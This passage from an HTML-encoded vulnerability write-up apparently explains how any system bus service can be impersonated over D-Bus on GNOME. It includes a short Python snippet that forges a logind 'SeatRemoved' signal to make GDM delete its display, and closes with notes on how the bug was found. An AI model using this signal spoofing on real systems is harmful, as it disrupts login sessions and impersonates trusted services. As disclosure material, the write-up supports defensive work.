lang=\&quot;c\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\u003cspan class=\&quot;n\&quot;\u003eg_variant_get\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eparameters\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;s\&quot;\u003e\&quot;(u)\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003estate\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC15\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\u003cspan class=\&quot;k\&quot;\u003eif\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eonline\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e!\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eis_nm_connected\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003estate\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e))\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e{\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC16\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\t\u003cspan class=\&quot;n\&quot;\u003edebug\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eDEBUG_NET\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;s\&quot;\u003e\&quot;network manager: no network connection -\u0026gt; going offline\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC17\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\t\u003cspan class=\&quot;n\&quot;\u003enetwork_monitor_set_online\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eFALSE\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC18\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\u003cspan class=\&quot;p\&quot;\u003e}\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003eelse\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003eif\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e!\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eonline\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eis_nm_connected\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003estate\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e))\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e{\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC19\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\t\u003cspan class=\&quot;n\&quot;\u003edebug\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eDEBUG_NET\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;s\&quot;\u003e\&quot;network manager: active connection -\u0026gt; going online\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC20\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\t\u003cspan class=\&quot;n\&quot;\u003enetwork_monitor_set_online\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eTRUE\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC21\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\t\u003cspan class=\&quot;p\&quot;\u003e}\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC22\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;p\&quot;\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;224:1-224:126\&quot; dir=\&quot;auto\&quot;\u003eThis approach can be used to impersonate any system bus service. For instance, the following attacks gdm impersonating logind:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;226:1-238:3\&quot; data-canonical-lang=\&quot;python\&quot; class=\&quot;code highlight js-syntax-highlight language-python\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003cspan class=\&quot;n\&quot;\u003evictim_bus_user\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003eawait\u003c/span\u003e \u003cspan class=\&quot;nf\&quot;\u003efind_bus_service_with_process_string\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e   \u003cspan class=\&quot;n\&quot;\u003ebus\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003e/usr/bin/gdm\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003cspan class=\&quot;n\&quot;\u003emalicious_msg\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eMessage\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003enew_signal\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003epath\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003e/org/freedesktop/login1\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003einterface\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003eorg.freedesktop.login1.Manager\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003emember\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003eSeatRemoved\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003esignature\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003eso\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003ebody\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e[\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003eseat0\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e        \u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s\&quot;\u003e/org/freedesktop/login1/seat/seat0\u003c/span\u003e\u003cspan class=\&quot;sh\&quot;\u003e\&quot;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e    \u003cspan class=\&quot;p\&quot;\u003e])\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;240:1-240:252\&quot; dir=\&quot;auto\&quot;\u003eBy using D-Feet you can see the D-Bus tree for org.gnome.DisplayManager and how if you run that script, the entry under /org/gnome/DisplayManager/Displays/ is deleted as GDM uses g_dbus_connection_signal_subscribe() to handle the \&quot;SeatRemoved\&quot; signals:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;242:1-257:3\&quot; data-canonical-lang=\&quot;c\&quot; class=\&quot;code highlight js-syntax-highlight language-c\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;k\&quot;\u003estatic\u003c/span\u003e \u003cspan class=\&quot;kt\&quot;\u003evoid\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;nf\&quot;\u003eon_seat_removed\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eGDBusConnection\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003econnection\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                 \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003egchar\u003c/span\u003e     \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esender_name\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                 \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003egchar\u003c/span\u003e     \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eobject_path\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                 \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003egchar\u003c/span\u003e     \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003einterface_name\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                 \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003egchar\u003c/span\u003e     \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esignal_name\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                 \u003cspan class=\&quot;n\&quot;\u003eGVariant\u003c/span\u003e        \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eparameters\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                 \u003cspan class=\&quot;n\&quot;\u003egpointer\u003c/span\u003e         \u003cspan class=\&quot;n\&quot;\u003euser_data\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;p\&quot;\u003e{\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e        \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;kt\&quot;\u003echar\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eseat\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e        \u003cspan class=\&quot;n\&quot;\u003eg_variant_get\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eparameters\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;s\&quot;\u003e\&quot;(\u0026amp;s\u0026amp;o)\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eseat\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;nb\&quot;\u003eNULL\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e        \u003cspan class=\&quot;n\&quot;\u003edelete_display\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eGDM_LOCAL_DISPLAY_FACTORY\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003euser_data\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e),\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eseat\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;p\&quot;\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;259:1-270:3\&quot; data-canonical-lang=\&quot;c\&quot; class=\&quot;code highlight js-syntax-highlight language-c\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;n\&quot;\u003efactory\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eseat_removed_id\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eg_dbus_connection_signal_subscribe\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003efactory\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003econnection\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                              \u003cspan class=\&quot;s\&quot;\u003e\&quot;org.freedesktop.login1\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                              \u003cspan class=\&quot;s\&quot;\u003e\&quot;org.freedesktop.login1.Manager\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                              \u003cspan class=\&quot;s\&quot;\u003e\&quot;SeatRemoved\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                              \u003cspan class=\&quot;s\&quot;\u003e\&quot;/org/freedesktop/login1\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                              \u003cspan class=\&quot;nb\&quot;\u003eNULL\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                              \u003cspan class=\&quot;n\&quot;\u003eG_DBUS_SIGNAL_FLAGS_NONE\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                              \u003cspan class=\&quot;n\&quot;\u003eon_seat_removed\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                              \u003cspan class=\&quot;n\&quot;\u003eg_object_ref\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003efactory\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e),\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                              \u003cspan class=\&quot;n\&quot;\u003eg_object_unref\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;272:1-272:12\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-discovery\&quot; class=\&quot;anchor\&quot; href=\&quot;#discovery\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eDiscovery\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;274:1-274:98\&quot; dir=\&quot;auto\&quot;\u003eI found this bug after finding a typo in one of the D-Bus strings of gnome-shell screen recording.\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;276:1-290:3\&quot; data-canonical-lang=\&quot;js\&quot; class=\&quot;code highlight js-syntax-highlight language-javascript\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e\u003cspan class=\&quot;k\&quot;\u003ethis\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003e_streamProxy\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003enew\u003c/span\u003e \u003cspan class=\&quot;nc\&quot;\u003eScreenCastStreamProxy\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003eGio\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003eDBus\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003esession\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e    \u003cspan class=\&quot;dl\&quot;\u003e&#39;\u003c/span\u003e\u003cspan class=\&quot;s1\&quot;\u003eorg.gnome.ScreenCast.Stream\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e&#39;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;c1\&quot;\u003e// \u0026lt;-- should be &#39;org.gnome.Mutter.ScreenCast.Stream&#39;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e    \u003cspan class=\&quot;nx\&quot;\u003estreamPath\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e\u003cspan class=\&quot;k\&quot;\u003ethis\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003e_streamProxy\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003econnectSignal\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e&#39;\u003c/span\u003e\u003cspan class=\&quot;s1\&quot;\u003ePipeWireStreamAdded\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e&#39;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e    \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003e_proxy\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003e_sender\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003eparams\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e{\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e        \u003cspan class=\&quot;kd\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e[\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003enodeId\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e]\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003eparams\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e        \u003cspan class=\&quot;k\&quot;\u003ethis\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003e_nodeId\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003enodeId\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e        \u003cspan class=\&quot;k\&quot;\u003ethis\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003e_pipelineState\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003ePipelineState\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003eSTARTING\u003c/span\u003e\u003cspan 